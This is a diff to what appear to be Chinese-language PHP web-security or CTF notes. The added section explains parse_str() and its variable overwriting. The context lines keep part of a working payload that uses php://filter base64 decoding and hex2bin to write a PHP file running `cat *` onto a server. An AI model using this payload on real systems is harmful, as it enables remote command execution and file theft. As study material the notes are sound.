@@ -96,3 +96,26 @@ $c=bin2hex('PD89YGNhdCAqYDs');
 ?v2=115044383959474e6864434171594473&v3=php://filter/write=convert.base64-decode/resource=1.php
 POST:v1=hex2bin
 ```
+
+
+
+
+^
+## **parse_str()函数**
+parse_str() 函数把查询字符串解析到变量中。(以数组的方式)。
+如果未设置第二个参数的array参数，由该函数设置的变量将覆盖已存在的同名变量。
+```
+// 假设我们有一个 URL 编码的字符串
+$str = "name=Kimi&age=30";
+
+// 使用 parse_str() 解析字符串
+parse_str($str);
+
+// 输出解析后的变量
+echo $name; // 输出 Kimi
+echo $age;  // 输出 30
+
+parse_str($str,$arr);
+$arr['name']
+$arr['age']
+```
